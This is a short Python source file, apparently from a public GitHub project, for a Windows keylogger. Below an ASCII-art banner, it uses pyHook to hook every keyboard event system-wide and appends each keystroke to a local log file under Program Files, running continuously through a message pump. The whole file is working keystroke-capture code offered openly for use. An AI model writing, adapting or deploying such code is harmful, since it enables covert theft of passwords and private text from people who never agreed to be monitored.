# $$\   $$\                    $$\                                                   
# $$ | $$  |                   $$ |                                                  
# $$ |$$  / $$$$$$\  $$\   $$\ $$ | $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
# $$$$$  / $$  __$$\ $$ |  $$ |$$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
# $$  $$<  $$$$$$$$ |$$ |  $$ |$$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|
# $$ |\$$\ $$   ____|$$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      
# $$ | \$$\\$$$$$$$\ \$$$$$$$ |$$ |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |\$$$$$$$\ $$ |      
# \__|  \__|\_______| \____$$ |\__| \______/  \____$$ | \____$$ | \_______|\__|      
#                    $$\   $$ |              $$\   $$ |$$\   $$ |                    
#                    \$$$$$$  |              \$$$$$$  |\$$$$$$  |                    
#                     \______/                \______/  \______/                     
#         __                                                                         
#   /    (    _ '  _ _                                                               
#  ()(/ __)(// /(/(/(/         @ https://github.com/SuriyaaKudoIsc/keylogger         
#    /          /                                                                    


## Python libraries (use the recommended version "Python 2.7.10"!)
import pyHook
import pythoncom
import sys
import logging

## File log path (set it whatever you want!)
file_log = 'C:\\Program Files\\keylogger\\log.txt'

## Save stuffs as ASCII-type messages in log.txt
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

## Manage/Run the keylogger automatically
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
